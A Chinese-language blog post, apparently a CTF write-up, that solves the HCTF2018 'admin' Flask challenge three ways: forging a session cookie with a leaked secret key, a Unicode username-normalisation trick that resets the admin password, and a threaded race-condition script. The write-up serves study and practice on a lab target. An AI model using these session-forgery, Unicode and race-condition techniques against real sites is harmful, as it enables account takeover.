@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>HCTF2018-admin - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=writeup,buuoj,flask,session伪造,条件竞争,unicode>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">HCTF2018-admin</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#发现源代码"><span class="toc-text">发现源代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解法1-flask-session-伪造"><span class="toc-text">解法1.flask session 伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解法2-unicode欺骗"><span class="toc-text">解法2.unicode欺骗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解法3-条件竞争"><span class="toc-text">解法3.条件竞争</span></a></li></ol>
+
+  <div class="post-content">
+    <p>趁着国庆假期想做做题，结果buuoj的web居然关了…<br>这题的docker<br><a href="https://github.com/woadsl1234/HCTF2018_admin" target="_blank" rel="noopener">https://github.com/woadsl1234/HCTF2018_admin</a><br>如果出现登录和注册返回500，mysql的docker不断重启的情况，可以把docker-compose.yml中的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">image: daocloud.io&#x2F;library&#x2F;mysql:5.7.4</span><br></pre></td></tr></table></figure>
+<p>改为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">image: mysql:5.7</span><br></pre></td></tr></table></figure>
+<p>然后进入mysql的docker，执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash /usr/local/mysql/1.sh</span><br></pre></td></tr></table></figure>
+
+<p>吐槽下两个弟弟舍友，一个出去旅游，一个和女朋友出去住了(???)，就留我一个人在宿舍，真是惨惨</p>
+<h2 id="发现源代码"><a href="#发现源代码" class="headerlink" title="发现源代码"></a>发现源代码</h2><p>首页html中有</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br></pre></td></tr></table></figure>
+<p>应该是要登录admin账户</p>
+<p>注册一个账户登录后可以在修改密码页面的源码中找到github的链接</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span></span><br></pre></td></tr></table></figure>
+<p>从而得到源码，可以看到使用了flask框架</p>
+<h2 id="解法1-flask-session-伪造"><a href="#解法1-flask-session-伪造" class="headerlink" title="解法1.flask session 伪造"></a>解法1.flask session 伪造</h2><p>登陆后存在一个cookie</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session&#x3D;.eJxF0EFrwkAQBeC_UubsoW7NRfAQWRMUZoKyTdi5SDSx7m7WQqIYV_zvjRba63vwPWbusD20dXeE6bm91CPYmgqmd3jbwRSoWDWZjMfs2aDMDVo9IYE9ycphkTTaLq5k5w7FepIViwgDH1kmjvzKYGgM241hj7fsmYW5Zxn32i8jkpuGrQtoFxEFejqCC5yQSpy2bLXSIkvZZnL_wWpQi9xrVXmSLpD9vHGaH3GwULmgbdVkKp7BYwT7rj1sz9-uPv2fkG4cprkhse5pINnGASU7Umwx6CsW2A-p52FSi-UVfWIwnr0448uv-k9iH3X5-rc5lX4ooKy8OQkYwaWr29fjYPwOjx_OCm8N.XZQGLA.L8Mzu4W0sdrmDWiod1xuoVeKHHc</span><br></pre></td></tr></table></figure>
+<p>根据p神的文章 <a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a><br> 可以知道，flask的session是存在客户端的，并且没有加密。为了保证session不被篡改，flask会在数据后面附上数据的签名，在不知道secret_key的情况下是无法伪造签名的</p>
+<p> 但在这题的源代码中已经泄露了secret_key<br> 在config.py中<br> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY = os.environ.get(<span class="string">'SECRET_KEY'</span>) <span class="keyword">or</span> <span class="string">'ckj123'</span></span><br></pre></td></tr></table></figure><br>使用这个脚本 <a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a> 对session进行decode和encode</p>
+<ul>
+<li>对session进行decode<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c "ckj123" -c ".eJxF0EFrwkAQBeC_UubsoW7NRfAQWRMUZoKyTdi5SDSx7m7WQqIYV_zvjRba63vwPWbusD20dXeE6bm91CPYmgqmd3jbwRSoWDWZjMfs2aDMDVo9IYE9ycphkTTaLq5k5w7FepIViwgDH1kmjvzKYGgM241hj7fsmYW5Zxn32i8jkpuGrQtoFxEFejqCC5yQSpy2bLXSIkvZZnL_wWpQi9xrVXmSLpD9vHGaH3GwULmgbdVkKp7BYwT7rj1sz9-uPv2fkG4cprkhse5pINnGASU7Umwx6CsW2A-p52FSi-UVfWIwnr0448uv-k9iH3X5-rc5lX4ooKy8OQkYwaWr29fjYPwOjx_OCm8N.XZQGLA.L8Mzu4W0sdrmDWiod1xuoVeKHHc"</span><br></pre></td></tr></table></figure>
+得到<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'&#123;"_fresh":true,"_id":&#123;" b":"NWJlODA1ZmZiMDViMjY4N2MxNDdkMWFlYjEwNjBkM2Q4OWE5MzZhZDFkNmJiMzliZjRiZmMyODFkNzBmZDAxYmI5NDRlZjkzMjE5NzNlYjE2ZWM4NTFkYjZjYTY2OGZjODc3ZTMzZWVmYTdmNDkzNjUyZGVhMDAxMTkzYjdlOTA="&#125;,"csrf_token":&#123;" b":"NGRkMGViN2QxNGZjZjAzMDZkNTZjMzYwMWMxZjZmZTY2Y2IwMmFiMA=="&#125;,"image":&#123;" b":"Zm5sVQ=="&#125;,"name":"admin2","user_id":"10"&#125;'</span></span><br></pre></td></tr></table></figure></li>
+<li>将name改为admin后encode<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s "ckj123" -t "&#123;'_fresh': True, '_id': b'5be805ffb05b2687c147d1aeb1060d3d89a936ad1d6bb39bf4bfc281d70fd01bb944ef9321973eb16ec851db6ca668fc877e33eefa7f493652dea001193b7e90', 'csrf_token': b'a7cb3920a7f0b7d08949f8a61f2078854dafef35', 'image': b'hmfP', 'name': 'admin', 'user_id': '10'&#125;"</span><br></pre></td></tr></table></figure>
+然后将session改为得到的字符串就可以以admin登录拿到flag<br>这里有个很坑的是这个脚本在linux下生成的session不能用。。但是windows下就可以。。<h2 id="解法2-unicode欺骗"><a href="#解法2-unicode欺骗" class="headerlink" title="解法2.unicode欺骗"></a>解法2.unicode欺骗</h2>这个点才是这题想考的<br>在注册登录和密码修改中都使用了一个自己定义的函数strlower，将用户名变为小写<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>
+nodeprep是从twisted中导入的<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="keyword">import</span> nodeprep</span><br></pre></td></tr></table></figure>
+去github中搜索一下可以发现Twisted已经更新到19.2.0了，而这题的requirements.txt中使用的Twisted还是10.2.0<br>搜索一下发现nodeprep.prepare存在unicode的安全问题,这也是Spotify任意用户密码重置漏洞的成因<br><a href="http://webcache.googleusercontent.com/search?q=cache:1Jt1a9v583sJ:blog.lnyas.xyz/?p%3D1411&amp;hl=zh-CN&amp;gl=hk&amp;strip=1&amp;vwsrc=0" target="_blank" rel="noopener">http://webcache.googleusercontent.com/search?q=cache:1Jt1a9v583sJ:blog.lnyas.xyz/?p%3D1411&amp;hl=zh-CN&amp;gl=hk&amp;strip=1&amp;vwsrc=0</a> (原网页挂了，这是google的快照)</li>
+</ul>
+<blockquote>
+<p>这个函数会把大写转换为小写，把类似的unicode字符做一个与chrome的地址栏里相似的转换，举个例子<br>BIG会被转换为big, ƁƗƓ会被转换为ɓɨɠ<br>他们对用户名是否重复的判断是执行一次这个函数然后进行比对 ，例如AAA会被变为aaa则和之前已经注册过的aaa重复 ，但是这里出现了一个错误，注册一个ᴬᴬᴬ，经过函数处理后变成了AAA，因为与aaa不同所以注册成功，而在用户点击重置密码的连接的时候，这个函数再次被执行了一次，AAA变成了aaa，导致用户aaa的密码被越权修改</p>
+</blockquote>
+<ul>
+<li>按照文中的思路，注册一个用户ᴬdmin,登录后会发现变成了Admin，修改密码时再次调用strlower，Admin变为admin，从而重置admin的密码</li>
+</ul>
+<h2 id="解法3-条件竞争"><a href="#解法3-条件竞争" class="headerlink" title="解法3.条件竞争"></a>解法3.条件竞争</h2><ul>
+<li>在修改密码时用户名由session中获得<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = strlower(session[<span class="string">'name'</span>])</span><br></pre></td></tr></table></figure></li>
+<li>而在登陆时会先设置一个session再验证用户名密码是否正确<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">'name'</span>] = name //就是这句</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">'Invalid username or password'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br></pre></td></tr></table></figure>
+因此可以进行条件竞争，进程1不断登录并修改密码，进程2不断以admin为用户名进行登录，使得修改密码的时候获得到admin的用户名，修改admin的密码<br>附上网上大佬的脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">import</span> threading</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(s, username, password)</span>:</span> </span><br><span class="line">    data = &#123;<span class="string">'username'</span>: username, <span class="string">'password'</span>:password, <span class="string">'submit'</span>: <span class="string">''</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">"http://admin.2018.hctf.io/login"</span>, data=data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.get(<span class="string">"http://admin.2018.hctf.io/logout"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(s, newpassword)</span>:</span> </span><br><span class="line">    data = &#123;<span class="string">'newpassword'</span>:newpassword &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">"http://admin.2018.hctf.io/change"</span>, data=data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(s)</span>:</span></span><br><span class="line">    login(s, <span class="string">'ddd'</span>, <span class="string">'ddd'</span>) </span><br><span class="line">    change(s, <span class="string">'qweqweabcabc'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span><span class="params">(s)</span>:</span> </span><br><span class="line">    logout(s)</span><br><span class="line">    res = login(s, <span class="string">'admin'</span>, <span class="string">'qweqweabcabc'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'&lt;a href="/index"&gt;/index&lt;/a&gt;'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">    print(<span class="string">'finish'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        t1 = threading.Thread(target=func1, args=(s,)) t2 = threading.Thread(target=func2, args=(s,)) t1.start()</span><br><span class="line">            t2.start()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-10-02</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/buuoj/" rel="tag">buuoj</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/flask/" rel="tag">flask</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/session%E4%BC%AA%E9%80%A0/" rel="tag">session伪造</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/unicode/" rel="tag">unicode</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" rel="tag">条件竞争</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2022
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
